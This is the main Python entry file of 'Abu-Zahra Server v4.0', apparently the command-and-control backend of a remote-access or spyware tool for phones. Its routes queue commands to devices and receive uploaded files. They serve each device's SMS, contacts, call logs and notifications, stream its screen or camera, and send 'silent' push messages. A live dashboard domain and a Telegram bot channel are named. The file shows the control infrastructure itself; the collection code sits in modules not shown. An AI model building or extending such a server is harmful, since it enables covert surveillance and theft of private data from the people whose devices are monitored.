"""
Abu-Zahra Server v4.0 - Main Entry Point
Architecture: Client → Server ← {Web Dashboard, Admin App, Telegram Bot}
Server as the sole central hub.
"""

import asyncio
import logging
import signal
import sys
import os

from aiohttp import web

# Add parent to path for module imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.config import SERVER_HOST, SERVER_PORT, VERSION, DATA_DIR
from modules.store import store as data_store
import modules.firebase_client as firebase_client
from modules.telegram_bot import start_bot, close as tg_close
from modules.file_storage import cleanup_loop as file_cleanup_loop
from modules.api_handlers import (
    cors_middleware,
    # Public
    api_health, api_login, api_firebase_auth, api_web_register,
    # Device
    api_register, api_restore_session, api_get_commands, api_command_result, api_device_data,
    api_heartbeat, api_register_fcm_token, api_device_event, api_upload_file, api_upload_base64,
    api_download_file, api_device_settings,
    # Web/Admin
    api_web_devices, api_web_device_detail, api_web_commands, api_web_events,
    api_web_stats, api_web_send_command, api_web_link_code,
    api_web_settings_get, api_web_settings_set, api_web_unlink, api_web_logout,
    # User Management
    api_web_users, api_web_create_user, api_web_delete_user,
    api_web_regenerate_code,
    # Telegram deep-link account linking
    api_web_tg_link_token,
    # Files
    api_web_files, api_web_list_files_device,
    # Stored data (Firebase read endpoints — view current sms/contacts/etc.)
    api_web_get_data, api_web_get_notifications, api_web_clear_notifications,
    # Streaming
    api_stream_frame, api_stream_status, api_stream_start, api_stream_stop,
    api_jpeg_stream_start, api_jpeg_stream_stop,
    # WebSocket
    ws_dashboard, ws_stream, ws_stream_viewer, ws_webrtc_signaling,
    # Background
    dashboard_push_loop,
)
from modules.dashboard_html import DASHBOARD_HTML
from modules.commands import CMD_CATEGORIES
from modules import fcm_client

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger("server")


def create_app() -> web.Application:
    app = web.Application(middlewares=[cors_middleware])
    
    # ─── Dashboard HTML ────────────────────────────────────────
    async def serve_dashboard(request):
        return web.Response(text=DASHBOARD_HTML, content_type='text/html', charset='utf-8')
    
    # ─── Routes ────────────────────────────────────────────────
    
    # Dashboard pages
    app.router.add_get('/', serve_dashboard)
    app.router.add_get('/dashboard', serve_dashboard)
    
    # Public API
    app.router.add_get('/api/health', api_health)
    app.router.add_post('/api/login', api_login)
    app.router.add_post('/api/web/login', api_login)  # Alias for Admin App
    app.router.add_post('/api/web/firebase_auth', api_firebase_auth)
    app.router.add_post('/api/web/register', api_web_register)
    app.router.add_post('/api/register', api_register)
    app.router.add_post('/api/verify_link', api_register)  # Alias
    app.router.add_post('/api/restore_session', api_restore_session)
    
    # Device API
    app.router.add_get('/api/commands/{device_id}', api_get_commands)
    app.router.add_get('/api/commands', api_get_commands)
    app.router.add_post('/api/command_result/{command_id}', api_command_result)
    app.router.add_post('/api/data/{device_id}', api_device_data)
    app.router.add_post('/api/data', api_device_data)
    app.router.add_post('/api/heartbeat', api_heartbeat)
    app.router.add_post('/api/register_fcm_token', api_register_fcm_token)
    app.router.add_post('/api/event', api_device_event)
    app.router.add_post('/api/upload', api_upload_file)
    app.router.add_post('/api/upload_base64', api_upload_base64)
    app.router.add_get('/api/settings/{device_id}', api_device_settings)
    
    # File download
    app.router.add_get('/api/files/{file_id}', api_download_file)
    
    # Authenticated Web/Admin API
    app.router.add_get('/api/web/devices', api_web_devices)
    app.router.add_get('/api/web/device/{device_id}', api_web_device_detail)
    app.router.add_get('/api/web/commands', api_web_commands)
    app.router.add_get('/api/web/events', api_web_events)
    app.router.add_get('/api/web/stats', api_web_stats)
    app.router.add_post('/api/web/send_command', api_web_send_command)
    app.router.add_get('/api/web/link_code', api_web_link_code)
    app.router.add_post('/api/link_code', api_web_link_code)  # Alias
    app.router.add_get('/api/web/settings', api_web_settings_get)
    app.router.add_put('/api/web/settings', api_web_settings_set)
    app.router.add_delete('/api/web/unlink/{device_id}', api_web_unlink)
    app.router.add_post('/api/web/logout', api_web_logout)
    
    # User Management (Admin)
    app.router.add_get('/api/web/users', api_web_users)
    app.router.add_post('/api/web/users', api_web_create_user)
    app.router.add_delete('/api/web/users/{user_id}', api_web_delete_user)
    app.router.add_post('/api/web/regenerate_code', api_web_regenerate_code)

    # Telegram deep-link account linking (one-time token, 10 min)
    app.router.add_post('/api/web/tg_link_token', api_web_tg_link_token)
    
    # File Management
    app.router.add_get('/api/web/files', api_web_files)
    app.router.add_get('/api/web/device/files', api_web_list_files_device)

    # Stored Data API (read from Firebase RTDB)
    # GET    /api/web/data/{device_id}?type=sms|contacts|calls|...
    # GET    /api/web/notifications/{device_id}
    # DELETE /api/web/notifications/{device_id}
    app.router.add_get('/api/web/data/{device_id}', api_web_get_data)
    app.router.add_get('/api/web/notifications/{device_id}', api_web_get_notifications)
    app.router.add_delete('/api/web/notifications/{device_id}', api_web_clear_notifications)
    
    # Streaming API
    app.router.add_get('/api/stream/frame/{device_id}', api_stream_frame)
    app.router.add_get('/api/stream/status', api_stream_status)
    app.router.add_post('/api/stream/start', api_stream_start)
    app.router.add_post('/api/stream/stop', api_stream_stop)
    app.router.add_post('/api/stream/jpeg_start', api_jpeg_stream_start)
    app.router.add_post('/api/stream/jpeg_stop', api_jpeg_stream_stop)
    
    # WebSocket endpoints
    app.router.add_get('/ws/dashboard', ws_dashboard)
    app.router.add_get('/ws/stream', ws_stream)
    app.router.add_get('/ws/stream/viewer', ws_stream_viewer)
    app.router.add_get('/ws/webrtc', ws_webrtc_signaling)
    
    # ─── Startup & Cleanup ────────────────────────────────────
    
    async def on_startup(app):
        logger.info(f"Abu-Zahra Server v{VERSION} starting...")
        
        # Load all data
        await data_store.load_all()
        logger.info(f"Loaded {len(data_store.devices)} devices, {len(data_store.users)} users, {len(data_store.events)} events")
        
        # Check Firebase
        await firebase_client.check_connectivity()
        logger.info(f"Firebase: {'connected' if firebase_client.firebase_connected else 'disconnected'}")
        # Log FCM status (best-effort silent push channel)
        logger.info(f"FCM silent push: {'configured' if fcm_client.is_fcm_available() else 'NOT configured (Service Account JSON missing)'}")
        
        # Start background tasks
        app['bg_tasks'] = set()
        
        # Firebase result listener
        app['bg_tasks'].add(asyncio.create_task(firebase_client.result_listener()))
        
        # Firebase stale command cleanup
        app['bg_tasks'].add(asyncio.create_task(firebase_client.cleanup_stale_commands()))
        
        # Telegram bot
        app['bg_tasks'].add(asyncio.create_task(start_bot()))
        
        # Device monitoring
        app['bg_tasks'].add(asyncio.create_task(device_monitor_loop()))
        
        # Session cleanup
        app['bg_tasks'].add(asyncio.create_task(cleanup_loop()))
        
        # File cleanup
        app['bg_tasks'].add(asyncio.create_task(file_cleanup_loop()))
        
        # Dashboard push
        app['bg_tasks'].add(asyncio.create_task(dashboard_push_loop()))
        
        # Command timeout cleanup (20 seconds)
        app['bg_tasks'].add(asyncio.create_task(command_timeout_loop()))
        
        logger.info(f"Server running on {SERVER_HOST}:{SERVER_PORT}")
        logger.info(f"Dashboard: https://alsydyabwalzhra.online")
    
    async def on_cleanup(app):
        logger.info("Server shutting down...")
        
        # Cancel background tasks
        for task in app.get('bg_tasks', set()):
            task.cancel()
        
        # Save all data
        await data_store.save_all()
        
        # Close connections
        await firebase_client.close()
        await fcm_client.close()
        await tg_close()
        
        logger.info("Server stopped")
    
    app.on_startup.append(on_startup)
    app.on_cleanup.append(on_cleanup)
    
    return app


async def device_monitor_loop():
    """Check device online status periodically."""
    while True:
        try:
            await asyncio.sleep(60)
            await data_store.check_device_online_status()
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Device monitor error: {e}")
            await asyncio.sleep(30)


async def cleanup_loop():
    """Periodic cleanup of expired sessions and pairing codes."""
    while True:
        try:
            await asyncio.sleep(3600)  # Every hour
            await data_store.cleanup_expired_sessions()
            await data_store.cleanup_expired_pairing_codes()
            await data_store.save_all()
            logger.info("Periodic cleanup completed")
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
            await asyncio.sleep(30)


async def command_timeout_loop():
    """Clean up expired commands every 5 seconds."""
    while True:
        try:
            await asyncio.sleep(5)
            expired = await data_store.cleanup_expired_commands()
            if expired and firebase_client.firebase_connected:
                for cmd_id, device_id in expired:
                    try:
                        await firebase_client.delete_command(device_id, cmd_id)
                    except:
                        pass
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Command timeout error: {e}")
            await asyncio.sleep(5)


if __name__ == '__main__':
    app = create_app()
    web.run_app(app, host=SERVER_HOST, port=SERVER_PORT, print=None)